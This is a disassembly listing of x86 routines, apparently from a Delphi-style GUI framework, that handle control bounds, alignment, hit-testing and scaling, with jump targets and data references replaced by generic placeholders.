cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_442f64
sub_443916
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_4421ac
mov cl 0x1
sub_443958
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_441f04
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_441f04
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_443988
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4439ac
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_407494
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_4038bc
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_442f30
mov [ ebx + 0xc ] eax
sub_443a50
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_441e58
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_441e58
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_443ae4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403608
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_4414f8
mov edx [ esp ]
mov eax esi
call sub_4414d4
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_441780
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_4417c4
sub_443b68
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_414b3c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_44187c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_414b8c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_441724
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443bf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_443ae4
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_448484
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_443b68
pop ecx
jmp r-xdata
sub_443c54
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_443d42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443d49
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_441d94
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_441d64
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_441d64
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404828
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_404480
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_441c84
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_443d50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_4038bc
sub_443d7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_443d9c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_443dbc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_443ddc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_443dfc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_443e1c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_443e3c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41e5f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4413b8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4038bc
sub_443e74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443f10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416b68
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44e4c8
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_44e600
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_441d64
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44e360
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_44e720
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f17
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_443f20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_443f5c
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_443f20
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_44400c
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_40384c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_444040
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_444060
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc8
call sub_4038bc
test al al
je r-xdata
mov eax edi
call sub_4440a0
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_4440cc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_4440f8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_407494
mov eax esp
call sub_414bb4
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4418a8
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_4038bc
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_4038bc
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_4418d4
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_414bb4
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_414b3c
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_44187c
sub_444220
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_444260
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440aa8
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_444294
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44438c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_440e64
push ebx
push sub_445cdc
call sub_41f228
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421b38
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_421ce0
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403a24
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45feac
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_404480
lea eax [ ebx + 0x188 ]
call sub_40442c
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444393
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_444393
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4443b8
push ebx
push esi
push edi
call sub_403a8c
mov ebx edx
mov edi eax
mov eax edi
call sub_41e444
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_406194
mov eax [ edi + 0x178 ]
call sub_4036c0
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43fa28
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_445044
mov eax edi
call sub_445284
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_4036c0
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_445248
mov esi eax
mov edx esi
mov eax edi
call sub_4450b0
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_445284
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_440f3c
test bl bl
jle r-xdata
call sub_41f2c0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403a74
sub_444488
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44454c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41639c
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_448644
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4161a0
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4162ec
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4161a0
test eax eax
je r-xdata
sub_44455c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_444dec
xor eax eax
push ebp
push sub_44459c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4411a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4445a3
mov eax [ ebp - 0x4 ]
call sub_444df4
retn
sub_4445a3
mov eax [ ebp - 0x4 ]
call sub_444488
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_445c14
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_442f30
sub_4445d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_4445f3 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_444664
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448788
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_414b3c
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4449d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4449da
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_4448fa ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
